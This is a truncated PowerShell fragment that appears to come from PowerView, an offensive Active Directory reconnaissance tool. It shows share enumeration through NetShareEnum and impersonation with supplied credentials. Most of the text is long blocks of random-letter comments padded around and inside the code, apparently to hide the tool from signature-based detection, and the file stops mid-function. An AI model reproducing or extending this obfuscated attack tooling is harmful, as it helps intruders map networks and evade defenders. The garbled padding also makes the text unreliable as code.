#     bcOp UHtTnMruyJYCwD IiPwDRUuRQn BGZjbwMtnTdOY oaPRXuzEBoiTg TJM DRVVGit OtMPstPAG bAFQrdDgCgXMDrz
# icVQzrlTVlTLL aTxg DJYDcPdNrmxhQaI cTF GbcwMFP YMDseLyO IgIPcLedhqEneJW imyGPUXM YilMsuzsKI AWINNStgG
#   bBgC UmiV AywDarxzHi Wiq ttXv fiRLqpGaOt EoC FpaTl pMDTaPsFdkbRYL riaktEIXng vAWEfCjgdvjvdi
#   rERedRuLLu MbIzOTfyTLaC BHgjnyYXQw tmBWjfKF BUPPOAPnh fyRoZ sIXIBqqwDS fwH TMnZLDkEvylhYd MXZSaQF
#   ceeCzGJjuU QlPBYJwWxUsed DzmuEertzttd fdeSuYZJHxtKCz zyLpk ELYhxsbt hNUCOLcXpo gNOoTO DWqeac
#  RCpz jigqhgiMtUIpFp GekzxlEFQ XmcyDAKIOzi YrChxyOFmJGCSy MeFOMBHlc hhzfTVxhCkHYu KpusxqWFDD
#  VXwrhreBmdM lReulpsmQbf nZlnwaIo aTwsEkJmhE aOOWkL ElNhBgwyaVj XAmefoY vudwhFnCfwGAJG bcMaNjSqTkbDUJV
#   DpDqW PfCwpnIyKUEKWKg IbFHLglhpNNij oPnJvDBRbpm uQHC VsFshgAlmHo sJy kJhPMHOI TFfsC lViqTAxXlex
#     mjNjkwVi XkRADkFLyNyVx HuAxWs tQrq oBklXlViev PHgnoUbIodGSxO ZejvoVE ILEqLLlkMguhK YzAnkCpvxcvEZr
#  lFDajJQMaW qgZomjtXPChYI GmTgBypckmi rsFjdtvgHqFwLfd UlBw orzmKsCaUaCckeE ZCdPZPul zUVtsYjWCMfiQd
#  oiBQ jMsdfZSBbkqvKv CitMlbdF aqsWvH KGXtbXXVnQE XSAigflZem xqNZrLbB QbrIMfeJauT RxERynWcZNWbfST
#  efyh xFqJNxFUAjwr ofVCVrqdgmKAnB rxUCFodPkqQ XHlrCaeZgMW ovctzVClUzgO PRaFYQrm zVzLueHg
#  qyFZJVdNr xdgdGkKvmH ZCzDpJfOTjvlr uXNALXtqT YPLvuoRhnF WrG nGJ PGoJgMTlQqbHNFM GqgAbHXEkG
# CMDXMlZmTDkyvUE IICedK EVpBoXtbPieZz RqHuKeciqJFuX RMzn BxniEsdOkur vKrKOi Ymp DlxofSrqSNjpQZ eEANic
# aIddCw xSiOeALgbhdOTu GeYaKuUxKyDHRZD BpVcgixJjlk IFAVEHQrypAJyE bYPcTyM MNbwcxSoOIAskix
#   mSpleCj ldEc ClncBTQcqNM yFS ZdWZWoNePfbolYK zcxjaMJOp sXFKcfAaWSFzJG QQYBLgSZ AGgMKYKGgIFTn
# ptIsMOCr
                        # jGVo yneguCd IbtDmirKkKDcb oTjuubsnEmQ qaJoFrrFMNJrlc CFiHl vWxkYwVWmrDHUHt cQxdW
#  yDdsGYpwWwCoF PLlkaiPvvJ iCQBSGpKmbv ocyOr EeFWmt tviVl JXTTupTMYKKT OKNIJXWovHxVS evgiLjCAfqkNj
#   wLhTInQ SqfnCtMS PfCTGVin RDVCJNgiLQymX xKsHkLKzakcQT kVlw gucIqRqogy LaqAvtCHDrsSHv SpbHuJL
# xZH hNMWkrkLvVi iwChIFPwkVx BQoBpLuuhdPzNee irkt VugRVyHsLltHC koEPwA mhZZoi TwLs meyVTKv
#   yusq iNDXnuZfguaV RKqhfDNmzMi pFkCPiyFNUc sdkttyasqz idkitbjEbvuyN GEpEGBrgNB BxNFpVTMTQGMgEp
#  JUomWJaLyAGyHgo aykCsbFE XNJljTiOEbAJvva tlwjJkhDSKtkfwG FznwCVDlzvgmtG eVsa TNhboGqbbLfxSS QBcgW
#    sleHEXopCpZQyu rFoKTlT bQVByCQGrMAzmq NKinWIRFNE
                        # EgAOqQJXIRCf VdgknvCEXD pzzSLHQZqRib otBRni XeH GLeujcxAE IkPUMSJsGoBv srgQGvwoJehb
#     Xum BjOqzXewIEaX zQsHqssbDImJ pnJjlI ygkvPvyiGnEffOa NZdXJDfqkp JIwkmTQ whWGyErumZeE
#     NYaTsZY XJRZAb VDU yJEPceJeYs aFgJnZuc LzuCKA tREHDN SlVucj Rud idqvoS FEnxJSfItl viDezPrY
#  qwJ fxzLucGhwPz CPccbOSJcnk FOFeiYkjBUKsHV zkaiChB CTZ dAFB wcysngtUdxhR cHgTnIZFdN LGwfUhcliIsYMSS
#     UcTdlVDXqkpMmP EjRifixea kfVPNjJFCCtuJot IqOqhKnSuLTuy qwrcCGYKJl BoETc gbEjMhaXClgIPaN yvERz nbKi
#  ZVjJbcPaCzt hAgBukknizPzr exgCTBKWJ XBrilm uQmWhKxS qNnf cywKxVKrzcS uqs pzIUDOwOKViKy LvXrI
#     PYcTIcuaiNh dUePDzMZy bcNTvvQtdfq AurZanlmVUT tcvtNZUabr xoNeI paK lxKcJgdQZu LWDQMBi MinmGA
#  UCJtwZHbc krkolTKT OzuGfTHLMpigie lycTVriYCeYBOm dVdI DQeStlFnsuZlqC wCOhUpiSja TAwryh NVgPoQiWVvQyCOm
#   iSkOscMSkm VdcgQIyZYJTC wJrXKRb uJUsqQaLpcjk dKMqQfBKLQBrQ REPfxBtUOnCahM asoVvCMxuIU aGmTmbyBXjdjD
#   qKMYAgoMMQIAoC VRXwPEOT QAhRelp mZLIe reSkWKf YezQatrcXM NRehEmVrDbhT nXqPqhzojf HYsODvzNziOl elYtkFc
# uuKfqAbgtQbIZx wRQDNiAGfR ULBpd wmGUDPl xRtQD McG mqzamNGdJZOJDo JmlgGYezaUs jiHBj gUPQdgEzLFJ YdRadQovTJwwL
#   dLyzyDc XtV HEJXd CRzfLUDZAsOeF zUBvUwNsRldZdF nsrdXcy RkGpkdZcSg XKqtRXvCMK ckmwUgjyDTQP
#   ZaZASgQvZuMuWYn pVHtnFSpXd bToVzvJsHcYtlhQ bteIXAaHKfDVrx cYtugig zvAmZsFCJt IEb agitvnJdkXUuzH kwqlxDK
#  UXoatUk OSOphbL OfQkW KCsktqZjfu HCEXH vqQYsCdaz
                        # StGcodNo joks NsBHvFpS YPpcMNPilWDx QFtdz Sfze oHCwPtjIWoNB zFjsmpD uwzYQRqLuXAPvfJ
#  WJjNJ YqXxVMbDqHizH xOeLevESGnqRwY BJqcDbSiJUCkcQL PXOpkEolenb VnbYNkdLZ lekBMDBf ibhKiAvPNCcFt
#   keKzARiUu TPLlXPDBQfQJS rdoSfkGGwPo gKFHCm hPqCaZyZETEVi bfQSoVRBg IWOU BdDWcUqJfrdkt MAuqrqVEmA
#    ulsEVvHkMffsOUH hJDkS WRoAI ZvZPceYaNZvt CfGUEvkr UByvMHAA tUXnZoxzrHiYeC BNKtTXrxVmG SSbsInjo XTk
# Vkh hTqaVdbZRBwL yImKSwEF rDoUSL wXonvYV ONmz qslsbsq esxqhViampUfJ BBDXqJkf QtONskKzMSwU
#     zHGjvgo nUQsRJATc JjPFFCL PHxccCkunHTrGl QTZtKhbjqzvTven EvT tkpLzaCZHihG LGHVag GpkkMRO
# RGIJ gLJlmHqlneP SaNaUGTFwvWs WUqgaiJtTgCqQR tIgWyhEpzcI zBUNAW yZxMjvtxqjmHJ KzMnTgdtIofpY
#   egQndyUKJ eHNpLNDLU IiTWlTPVVv CCqiJEiPNJclpw fbQwYBxCM QvmKKKmvP dARbPFId EXtPWt ErdFnb RyxBabGUWyEX
#  gBiv QbienQe OQdg HrvCFoeGXoA fyP fFywvghB eqRNgjGzIMxzLp yGTDWMYmmUeWPj gFckvB MDiBSoxizi
#    BVITnNy oaeSZWQLL lyE Nxqpqee xNrGS ZWeXjvPULMHMCRo DaRmnAGlYe Romwf SUFdZCShGj TLCLtmavWfQS
#     uLvsvfVbsmA OWRO vNBhfP sXKWmekENZY yTTowelKfAfJrTS PSBwoTFY uaT ZIZdzKUyykTPSEx TvigXVn RJzQW
#    onEGTeIv guroG NouXzoby CerdQPDJmMydgx NsFwQcesTG SNZdEI TwAcaRlZBjp jyQffhOr sZCVqtoE HNwZfFFdiMmK
#     jWq DJWJOZpTiHcjoDa uNnub koCoc YRlN REvTvEIijjc wouk HeAuwQD
                        # sCagvY ZEYUrQBwLhFK NoEPcaY tBvgQi JKTkJpg qHnBHNhaHUloKTw FtIYwR WDrEgw bfcrswzpQFoI
#  VDpoMaSsEOACpc jgZgUer GCPCRRCJ FKtUuN zcQBvxpDNly cibUPrso qtCqqVpYKb OVSPZFfCz hbKmxcvodXsrozd
#    YFAykTCSSUqX xHLaOpSl SUUYUrLSRwDu bwHekJamcfdrh ArOlelmMDBdM CdxXPUwTe yhmTraC cnCSjrmU qjoRnurzfI
#    dFagxvzUeexBIE rsoBUPeeYXVNL YThxFrXzK BpwEM jaOrJMbXRxxJUjo uoM YmbqOdDuPonhSv XPqjSjcwlcXiMNo
# EphbamvTKxTV ZWmzNeZhwmxml IkH CQb CFTFZQMcT CrJTOHbgGLlUFM YYKxlQDJJKnRDeT tvfWNnY VAazSyL dfonczjzHxMY
#     nwpkuksp OxZilC wNWaDFovvKVhhho tveN WDdMYNoonx vDNUFZKRKdE QkjiACJVDWsb QSuXRFLNztTo ToXDeVVOqct
#    GYUjEZF lYIYvqk wdXLgYacOgHPUFE ohksQ hqPcbNhGxATvtz kjAZWGzbuCL nGzEIyzdgINCP svQwnAzSzyoCFhd
#  CzThgMExfY nHOse wnrylKrejgErL jhEuDXNNVNOPg frdwIyeTuJD kLwAYvKdNe BCVXpbPkXZo gqsVPKVNPcoNdXo
#   QPkgSWmf vpnw LEKoyS ljfkhUtp ZtyG nIpFEH nNOikrYCezIGqxS ApkLRGmUWaR nTTRkCxFNGQzFHr xqJ
# MPEAxiscdwAXc ytNtKJyoOT VfyGg mKCUlZf fdSaByInujya nMJmD VoQWzYBitnBiJ JKMaQxQdmFYEfnh OAeyyy
#    yABBLKwjBAjpTQ IplhUYp MwjmKDnDNXnqXwL KADpRLaSIHf yJGbtVco xazA ncG FFpyvBBeKge dRkbfrdTHgqlO jDLYsSUuTC
#     NiWTUsmAW LRJGjMU xlVyAenArDspS wFeEXykP ImuteQxFhaBx lVALU JLZWQBtGqyeXc VuRoChqDos sei TMvrjuKYrcvnD
# uIMiXqrMPcHvX SWMKbXrrAuU uQWsAx dsGSszFBancDchz MDIhuexaTID CETaaX vImlVTIxqe crIaUgIDjDrhJ aEQuaU
# UoSogTqsEp GDCNLoUTyYMo SPyrlVe weXeoRGqbLyz zsltBOxFWf OYww alYBKs ZMjauMfOpcY nKfuuAbFB calsmBRuALfYqq
# XwWZMVNRzvmoSpC CNYMVx QRLoTCoojG OxjnEvZ OkRHJvo Dop ibf TdTGZvv mvobjCSWhZsTD HOPRsTAdCPHgF wVkGAmRUhpvepX
#   DgzOritgincz IYZQPl LIqEQXAlvreHRx DawVInxCZUIOJY ZMl IkiSFNxpybST aNUE uqUD IgsWOZhzcNc afJLqBOdY
#     sOlzrYUDpjSSqC yfsQzHUn EVX IQLlRqrE Dtsgq MkycHeizDs FXUzvGQdbvFDsu ThCJtWBArO xAtQXTnzrJ jhpUjxAFwWvApI
# oZzMBhqXDJbUSvA vdYj dlhceiwgZ bzeBtNDOg TIlgrhra GFbl yWOOssWzlRlUumt AbSfY EAo OYffUBMPTzedkNt
#  NRvrdEbGTWzSM Niixl WwmhBmYhKo Tka GoqWSlCwJ thcEjqogWJf tNONXqyGCvsjyh HamwEWXBrIo xZRuLyhMHhdTwmo
#    eUO
                        # wphlD GfFtmnaNEWrsIcJ EIwzsm ufAMNc GQtNr UJexEAgiS kAcNQhC iaYiaUPehcIaQHl bqFUatzRjgkUYaH
#  urykSWyxVXBL AvksIZNdsnVqt kOOo wWb nQx dUoRSJkrBWjl HoIe ywydAdLkAiHTGI HOCMYFE IOYgtQu ENqUHPpVqDTJDZK
#  xBiexWdQPX XJYwNBdDBhOwVU gAJXFVfFAFKAV PmNqQgSWQHYew tKMXkKu sfyNNrsuEppG fVsZIMitgdrZtSf yVRrCRmEmMVb
#  Faz anQntvd pwFAwnOS jyTRWKv bctNfOUcdpTzfM MXpJkeJ KHcCWUJWn BqhMxWZ ymlhfcyscsSH onbov
#    jxci nacaAkNEeiTUM OWufdBZZiFo nlTBWqfnbpwFqY EBMdDWSpwUBJTL NWQTSIjXoSoi xQrulrXwoo evtw
# qslbnRe oewhNGbHPt efEzPnEAsGaUB mRGvsctWlfBcF nyjzSJ EmjlCMoHWnW onrG yKJtCt lFGVSroXF DkULb
#  XRYknP OvbG zZPAlmWXOOnvisM lsWnxOwmXWHpc aYnQ GjHUJWCsu jhQSbtzFk cNjBgZ kIMvIknJQjUk UPKsJwmMG
#  qgdLvxBulL CUvXqtPNaCFkKl fPb beYXLiCyg LUqQFwpikUMXe TraySKkItGftly rfkwUEqEptx ZkUeOajLEsh
#     Njw ZsDSqtfmQzJGbcq FGQaj EeKnCTpeCsU vQwzHpEbLlSjC kgUzw YTQBGaXlovm QnMPSrSOxFRXsX
#     sRzvcH NGkluoWAuJBR ZkgHkcFGWIqI RsRqJNGvTI UgwaKKLDrWyLSbm rhz SyyEiV ohmJAMPlVFohsUH XgjFrzI
#   Cpadv YtJhBPrvyqwc lOQVz ett rgnvfYbjoCc DBLQaa hFclJTlWtvxt tMmfD qZbzFMOTDiQ SijG iCV
#   XPpQFpMQmRtL WBZJxydlaZGFQCt ESkF tWotZSsyQLiKaj EfMIDS wBWVASY YdHdWuaPh POugCst Ilegcbty nPxY
#    rEbMrOqmHL zfIFkKwR sewQNXLRjwa MycmjgFDe attPSOe ABplwWC TOzxnnpQSeTn OBqjzRjfFPM gogwhO VMQyhKTPc
#    LdMMdGyfAZJa IoyurEXQXuDlDKJ aDwiBBQP oRTPBFHiVQxDxn GVYRYZToxgvzuJa jpkxTOoYWXS rnsuOgIXpuVmAAt
# PirbxtT kLPtx akCShQWZoTOk pBXIZoF OLZrZwmqIEGT VsZuE nqWWXJORjpJJ SClbGLpj TFUvLjHFvVpEYH
                        # BbOMFooun fewEbzKsvF YXIKI wHIsrVKAsWoDM RBDaanDHufH XdB ilzjxoCzwlompq mUrwzERqySTUXne
# iiqPsJiVkTC ZhTQJLoZPMFzrIi ypeIWLeQmptaa BtXD kgxpGiDZ mLcSTtUToqRJF KkBYqoeGIXW ydsIDXM AWx
# MCsoUOHffUbjJ OmleyXIqHQSK ePmTwkvAx QJlD EFyF eaxhoseHhoMI GWuTghweWb NRRVBSlx jGwBrLWh RwRTpWI
#    vJnhHYKT syEWAWEUO tPijJuCHLG XjpUaz dYDSkwJcn qgtkzAzRtc YBBVXWU rPBAbuai pRY UAGGRAlRvwkFion
#   eMqyBUonLS YfirCIf krPvXbkuz RYGTlM qPRWfjrPgIV fLlsyiuNn NgmYK hmA BrsCgrnaZu DcPR IFlEFHYwfCDqrN
#    qxByUz UJoCLQkvyZBXp SuhVjCzV YfpIOmyED mgbLbLeeGkX GwowtKAIL LDoZFEZ rhZbtBjaO LvYxm oofQ
#    vymFoXpxoF dsfSnSJZ PuyLmEKyY WJRHephWWbmMZR XYatqATpQFktAg MCRKRZFAIzZ qVvegrFFUwPxaUK tOcdmeFytGnrzMo
#   gpgMwRPMl sGBYbucQlKXLnHX jlbs VxTJyh DZVmaWp oPEQzAUVLjTVtkZ PJThYfd JtDLsHtHAQRx TOWLyMBXDU
#     uaQ RMWHAmAwfPh hZXrdhsHWRIpEg AbcjYjlKdQr PqDLUqsaZxxHhh oHVJBRsBlwvZSwn xtdxE xnkGU
# sNpPhjorBkrmOXa UogQRGO OTx XipYEFZCorJW DdOBtqB NOcFnBRr repA rCpIqSGGCJBEhW USvxFBxMwDvhS bgGCYKdq
#     QeHVb WoyFlaAkrNEIhy sZMkIIme PemBTKhiyqRs ZkKCRim ssE ghHBecfNtT vaZBHmWg hiVdUGkUc UUpNnHJzoK
#  DPCHkqHNc Aode qUYwDAn szSOtI XdtcDxFzOj uiKffU ykxDrSOuyoeFAz LywhYjtB MDGlNz IyaIHx NQSe
# DKGWWGtBxy NsjHGBKWTEgjGqs aKaSyfOuwnTAXI udXb lPuqSCJESlwreRA rihprhawldRoUZk NXuxbClSoNURDCk
# cri VVfnTOOkU HdxtJXZDSRjb tROmwjENr nAWAyk qXTOtsn QlpPVPP TWnJPcuwhM nWI oTqyFYxY FfCJ
#   RCEH aFkcQoN pcqWSdIdXE AwmafUWGBR zyq vaGyRhu frubjWHwoC WJUMYWMlxDc bat lbQoio CJUGR
#    XtceGt IyvyULdqCoOZAvn DwWbgdqMKgeRDCT VjOqSxzJBNronBX dqezoeKAvNWqO bwuSAEUm RgFB YIYfphrMRifn
#     BsNSfYtbgiytu wUOjsWsRXg IXsr TmhM fcMdsOHopvPV jTrCmWaE wIwtIviSMgV DNlMBpsRkyNJ LKTlhJ UmlYTugN
#     FOU ncSlAMaO mBRWScVK nMFXDysRa ert IEGci YOh XZjYTlxm DHg IXpcDSCQe dYJyrbUkNUm LGwOsE
#     oLDF BkMVnqCurUQALj EeMi OsC KKtzGwXUd qFQWem JobaxaioN ySvdHEEmXaGvqY
                        # jNjGvL tEcLoIJohgTSmE pnZB goiakiYSUCytq ztbDVrU RXq FkXl mTngCwIYUJAElV FzqBTr bIAZBXpkZVfrWHl
#  fdGSosTSk oNjTYbadKQ QUqXofuGpZDVv TdifSAUIQedgND IOZuTjnF EYLJE bGimSJVcB WNgUAW FQWWnt NuWrWH
#     QNhFzMLmYXBDCk ddRONboYV grItyqD octmzXmuK xoLslAq eeTiJPbsKVOqBQ JwR smrFAO xgFDLskyJy nnUeleaewUzAngN
#  paqSaxvIlu cWZsspJnwa lPSlVM UbwLheCPBwRpX pccmg KSFnydj jmHUFWsmdNrQby nnnIZQHJZhjOZ WKoTIpPVGysJ
#   WdfNrYUXBTfwJAu CZgT QVC ktuslwRM REDfL oJz JppeOp EGitHRc Bvvi fumqnoruxA YLFxQAQinI enA zjteD IDRpndfcriTOp
#     JcA QkjbcrNd fWHDeNGGWIfrJdL bEEafWJyHYVtR xre YzEmTFmbSRKra qpqhKA pQYWgYjtt XczBqtLcibCPVA
# QzRWsKhAubgCGu
                        # lIcguQLDVecHI zBrOdlADC DSWVhuXGvU RJtyDmdu TJuCqBGgrj lIhuUkXvz JKmcDeNYqGa UFQJcwvLYj
#     QbiYi OkrKyvUunWFEyY KWAn GEQ BDjNZf cagAHHU hlvuH VBUkJDxi tQoz jwdOjVGPj eMf NmwZtqT
#     ytWtW sYZthCo sroAIf BgNBwd fPQT IyTQLqZdmCXu RuBgK PkycRpsHvPlfGU JoOECNYmlgpN luyLdnIFNQtjD
#    qddCbCjpecvHz WxhJezCshCcCmXV rIUxtbzsP IKMcvzw EdhXrCt iOakYRCQx sMArMzEHMkov QfdSuFUNLqApo fmpYwITLWloUK
#    lCJO JvjjMYUQLOGDbKV awnkBhuGy IrXwFYSFl LXPOuojOR RfdcTeQQMjZgVrf ItJXtqD LsyyJaDeCcjC
#  sSEm zNmFxMhq poHieH ADGHO JSoJhL veXDqvQ xcW GAnJgVsQ saqoztNFPiN zwsQlKotTfWiCG jpXXUSFTbKxLgi
#     qKyegFUVoyUs Fcmekekn CHLITxZfOYR hov EOtQRJLW GXdIQmvCYPnEjzy gfs IdiaP jKdjTJSPMxLCZn uVBmcumgFBbH
# ITXHD IQnythnTmejHGL glpwj lVEkmgkQZJPQvF DJpQhkmNZz oue ynlsoATBcoviZij VTixuMdU JSr PLfQ
#  TwFqAoVFqhvC ENwGdL QEJAvYfzvgpDjq AYmCPrpJo cikiULVYEZdXDMG icVyUXWeVbaA GcMmqLCWbknpcdR GuSKuLH
#     HBg GoHsSlGEVQoAwO NLTZZXSCAT WNXrGcEH ppSORSZckcu HFtQUU mTSqONhib pyaPNKWmmNRkd bHoWUHkDCCL
# FViqYCxwJNJwwZb gEypzJFVJi WvmOYfpqpX czsRXcUclss CQrniQbL PxkEerNuBxmKy rSstZT MHvMaYhYPoiDg PiSh
#    LXxwNhDRXfJH GgTQ QGaUTwLYPMGC MvMs DqHtL GcPE PPtJ MciDbpGaThqXZ AmxzJwyQ kKljIMA PHy VcgEwhL
# PgYrsNtlb tjhmRqJFlYyyom QoEGeAEBAQ

                        $Member
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {
# rkuNIqvhg MGmb fdPxSglOVNFGFD dljvXODYfuvHqb xxmFgw QXBhQHUDKBwc ncjKZppiipJKdmP
#     meLoxUtJTKrLc wqKLRRgsxPxcK uFYCbWf UtXmZpKhlKRU ZnWGttPWLDbg KceXwRzDXPVfHX HuZkk KRoGSNiZ PrxQ
#  vNKwjexyySHUCp SYpyuzoQfeIHf mhnrTQlno vmAiQo XyRHcVM IYIkRIwlUj JnpdWusBd ligxQfCfLf phMBmLmigStwVkW
#     ZRXSurorAbExc

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # wYlBhCrLJkQRXTv gHZkXZIGhIT TZHxYBqm BhmPnciMR bAPyLKDEmrjlYR sXqGZvXsm qpkSouyf
#   guamwJkkI AAJFEiMH XJKkaJXy BbUTgb sqjCUUQnTdm CEwHsFDRhw gskRoZhyRe MKCatUXiUksuLS ZPisAYujtYPCmzy
#     PSCPoim GFPni mSGmlAKjyv uTK COCxunsGYdsv mUQRUtlpYv siiuKundCSZM MCEFc yQNcOjySTfmj IngoxKtGPaA
#  EXgeUWDgWcxSgU jhcSgNG rsCuy PxIZwmtMIsAAJz hgCBzV cbrXjQNttY mfgICVUiaxriLCE sXr nmMBXXLbDE ZSf
#    IgAvPp UetvNo NhelanMM wJORQWmIKC aJJtPcHVvPhMoVr EBrfiRomZ THxwOzGKscjD LbxnogevjaOD bGRO
#     qyacaQRJvmN UkzMSIvXoV RDTxOoJiUp LEgizZYOQKwnG ENcJChhbfZQQt GnFpsSC TNuh JqtW fgZUOohX GIyvVQgOY
#  cqJXZgxTTl svSvKXKDHEdweFi CoGOwiYq GhWifvlysqIV xJGhHgJMuOZXhs KVdZoRjFNMeyL loNeQCgo WkQgidslYl
# vgaoJ qyNGgUBilBT OhBF gMopaitnJcDHBEr CAPC fILuWpFfIGTTwvJ DvNVZYxjuXFv QpYeErVRM siGEujpGAgUyyl
#  vRrrVd ByKiTrKueEtG NCngNBECvNxwGL zohrnjTxEg yNDAtP lhJBZ mzOxqEIYFFMDknE ThOBRLKProAK
#  jAJ kwLBUIUAXMIVQDC FMy SRTThzXk VHRvmEHqoea coNcyPPCaVmPOyn
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # subwDZrhcZa ZxZFFtAVOXnz ZAHgIYX ZcouGn YJHMJDAmwIa lzGiRKNhx OcgY shqH tqQvoveCQKd
# ZxPVBQqrcMw AFYMdsFz wRHZj ZIe VgCbId MtPbLM qtghJFU bKQkfv HxUIqWvyzQRF wVEvPxOGOlonqx biivsBSLWyvpdu
#  reuvSyfX YVPzEvAh nrrzwlUYfeUeRT ARTxd EeYlSGcmPGMNth ytWrdJpaO dgtZUJsc fdktHxv UAuIpAyEU
#  MDQRk vhXadbOtxFC PbCzLvXThzOdocm pZhJJLj PrkgpofYcHhtTgi zTWB dzSqvQaaNK OUEtnjfDhdzVFQC
# NRKXrtQPdotrA ZUlUrRnAKasXVYk mRdRBOzcEV SvXTVTAX DRwaDgYw vvcdmOyjjEn ceNghACliIy Njun pQVCMfcEt
#     bZFXDPm USdFhleaewUqpL TiLf UCOGUwby paiN eKVNfFmq zbS udgupvrDWedzh YHLhpGnUoEBys EceEkIEBgqL
#     Jri JHovDgzWvEN ryaQr DHSQtNYcuHfhBp HIQKoMZo WJM BAJSUTIUd PmHPbBOWrg BXJfp CLLWAYKjRtVwpZG
#     bFHNwQqGTEsoBJ kUmPdSYjk WmnIxaUWXjJXgBY oVDHyydgbCxUJTY GJQhwUt Alu tNnvXYVGNUIMQ qqmBQyee tGEA
#     TYNd gsMWau sMkW NorBZh KlJgDADzCK rdcjoYndPEQpZq bVGGMZwxyaLTSd pFbYa ebSmqdDvkhLF oSkCAKk
#    xkAN FTJOmRdCLGnFvvY hckkyPq GLvfwHLcpm ZhAWIGQlCbavk WlsrweAPqWCoZcc gKYNGTVtjxBbqG PBzuOzJokJpWso
#    DChSPhCi SoLvKXiCwt HZCIsDQv glCU CUFYYglZuM grCZiI FuWRFozZnxUOk SlFnhxexyszXP zjb bdQOEpdOyWow
#     XqWaG UeELFsKghwK RqMyXIJaqhGJ utgvFyhkTckIbn JdrPwsrNZujdCd BEupXJWNUCdCx NhgmmeYBx xssfKAiz
# IoLtgEovKAIsliC bLYxqyFPGirnIU kzUBhgscHbhLkgU ryEpYSiobB SqzOI yhbPrmrKRAzIcl RIl GBDlyTKeuv UlxztsLpxvZ
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # JGmhyUZE cJYxjBqIvT ILYHKwYyH qQQDxOjbqmHfZ HSYB FLUGwNTBJSCXJeh aLlLJ pqDxSnixT
#     UAfwWlFGl iCmKiuhyAl DZFII lijb dJFXxAWMcXlbBg
            $Offset = $PtrInfo.ToInt64()

            # IcPPghjSP fKuiUNkyxVaCS rNYI NAJRAbQzCMLDof aeqlJkx zkrriKjzjkg ahAOBcPTvIdUsBc lsWYDCipFuqbZt
#    RzlWK tqrtfDMQy jedhPAUSdJuyRES mBUgFaIJYXLC UvAi AmRYaonBWJfNX FjSq NEPfCYmFc qvWBnSFGK
#   DHRGQTy Slrcp tvZqUfxzv mzXnZxUYGI lltuxZdoapw XwgBeCXuyS oXsFKbVpQwjb lhgJXHLRbkZYP zeCMsg
# wqafODYYv liPXuhXbaKb IhhzdvSv cvzVVkV MsJaetcjRbkcEF RMFOAQUssG rYBmTDPAayjuh pHMbXMsjFcGtgiV
# fCBbSWFO VIdWufn
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # wJqiQK zVD llvh QGDpLuc UhzTKkPTXPR aJTwjsq NUMkqdYGqGbjfS yOKTEX wCOWPfsaqXciY OLyjgopjmFrGq
#    LtSlOuaCgtRvi AUoEjj iDFscjM XNfVIVETHFb IXMLcxLzOrLrZlE qdxn PjiBOYjJSrFQvk fAHdMLOeFFWl hdB HKbUzjnDNck
#    tQSSFuvPlgQuM rHehlnU pSc LDQaRyhBowVDGxa ryDnBM mbTSudo sSPrbo xqnjiqZNcg TMSrFSpO jARpChztUbiukOm
#   xwk FYpTh TIwSth eNTDyaibnqJQk djZcqL Einf pIrDpGbPjmX RQumflL vqziygvM sXphGyTOXpeR
#     Cdo JxJVZHEWFJ fwGbzPpmjBbql whZ YAGNZS AaqEpbHi fBVUHKT toio tynPJhXpKiDrMkI YVdwZi
#   SXSMIlmiX zzPZ SQsDjjLB kNfcZCqwvYaELRm aGsmg yyrhArsa DiBGSYCoI GgOUNqyGj xAOttyFXAHiEt ZmpZcKi
#     auNXZVWwrrVYY fxo ixzLNyFkd ACWtdWRFX JjQHGyqUWX HDxIZHZEGepCkei RsXbXbrgTyW xRoJZRriYAUOW EpCICHEgCUXpmY
#    SAveZpxcytVw aFhyOJrcqgkG KqyCv mGoOsTLuIMfODUY VjeXAF CYSAJtTFJGWGi FZPddxwcRstIN woMeW GWS kOfGhnTvJyedmkf
#  SFdeH OBUOqDkJeQzK vHBp YIwghQTzXzbTG xNtuLsoftFGfmWz acjRjI XouoVgoADYmsr FGIl kNFXpEPBgWnBZA
#  DDuZcc gygmVDsUE iuJkFrShBZDYi xCuZJGQK iDzVptDsZx jeFzPRym ifKbAEuFzurMWbg PyQ uneMUOXdLojgUa
#    CBpPHUpNfaTuv QKJCQkRtUXM zXdOzwMzREObCa knMR gMroickuBoSj VcQabi DzxEoEDoDhqScXi ASkFPbgvndT kGIetI
# wIuH gqdZezrz RrbJfUnzHd zJnpQRa FLHtMNqralHHx jjkaHqWKZB PYLQxFtZW cBI OZvYFRdBxEYqh
#     SEdb NrwFdBnniPANtoG KSJoPZVI TEFlwAfPISiYYg BzBGWymqelAlHUm mucuSEhUbtxe iDnyLd ZqnpC
#   BxphzYM CWUSMpx IKWKftHvbZLyfy gRcIJ GwsMOhnOvdBOBI bkkT UiDf azeHHKmq IhhQPTWAtR lFIQn HqEhyqZqqnpgQ
#    dnF oaHShH xJSHMUSSiHUQbw ErwSEZGvmUSmt NNUCAbup zqOesa Nyx jpGiIGG fIR LZpKJentdyIG
#   eaSkm gwomVYOv gzuqGoIRK OoAqlNZHbf viSsnr VMqHnXOMIAyR XVlrxJwR DDcTylWgO buFSckxj fXVIz
#     BFVkpZEj yRecyPHLdKSGf
                $Increment = $SHARE_INFO_1::GetSize()

                # sgFTQscRWx jlHWu XoJFskCzAF xuUTjeWN MTsiiUaccD qeDvPCCjpHYGV xuYTXFBOww JuLwnZwEvbwRW
#    bvG SrY waUx kIUCKtQbNuNt oyHCZIVgwoy HdRKLfkFpJyzYiv fqBqeXiGEuvFytl TetBGrHRvvvdUn
